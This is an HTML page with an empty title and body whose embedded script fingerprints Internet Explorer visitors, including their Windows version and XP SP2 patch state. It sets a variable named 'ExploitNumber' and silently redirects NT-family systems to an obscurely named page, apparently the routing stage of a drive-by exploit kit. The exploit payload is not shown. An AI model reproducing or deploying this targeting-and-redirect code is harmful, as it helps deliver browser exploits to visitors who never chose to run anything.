<HTML xmlns:IE>
<TITLE></TITLE>
<HEAD>
<STYLE type='text/css'>
IE\:clientCaps {behavior:url(#default#clientcaps)}
</STYLE>
</HEAD>
<BODY>

<IE:clientCaps ID="oClientCaps" /> 

<script type="text/javascript" language="JavaScript">
function Get_Win_Version(IE_vers)
{
 if (IE_vers.indexOf('Windows NT 5.1') != -1) return "wXPw"
 if (IE_vers.indexOf('Windows NT 5.2') != -1) return "w2K3w"
 if (IE_vers.indexOf('Windows NT 5.0') != -1) return "w2Kw"
 if (IE_vers.indexOf('Windows NT 4') != -1) return "wNTw"
 if (IE_vers.indexOf('Windows 95') != -1) return "w95w"
 if (IE_vers.indexOf('Windows 98') != -1) return "w98w"
 if (IE_vers.indexOf('Win 9x 4.9') != -1) return "wMEw"
 }
if (navigator.appName=="Microsoft Internet Explorer")
{
 var ExploitNumber=1; 
 var IEversion=navigator.appVersion;
 var IEplatform=navigator.platform;
 if (IEplatform.search("Win32") != -1) {
  var WinOS=Get_Win_Version(IEversion);
  PatchList = clientInformation.appMinorVersion;
  switch (WinOS)
  {
   case "wXPw":
    XP_SP2_patched=0;
    FullVersion=clientInformation.appMinorVersion;
    PatchList=FullVersion.split(";");
    for (var i=0; i < PatchList.length; i++) { if (PatchList[i]=="SP2") { XP_SP2_patched=1; } }
    if (XP_SP2_patched==1) { ExploitNumber=9; } 
    else { ExploitNumber=9; } 
    break;    
   case "w2Kw":
    ExploitNumber=9;
    break;
   case "w2K3w":
    ExploitNumber=9;
    break;     
   case "wNTw":
    ExploitNumber=9;
    break;     
   case "w95w":
    ExploitNumber=1;
    break;     
   case "w98w":
    ExploitNumber=1;
    break;     
   case "wMEw":
    ExploitNumber=1;
    break;     
   default:  
    ExploitNumber=9;  
    break;   
  }
  switch (ExploitNumber)
  {
   case  1:
    break;
   case  9:
    location.href="/ehp/ehp1_rggdnt2373.htm";
    break;  
   default:
    break;       
  }
 }
}
</script>

</BODY>
</HTML>
  
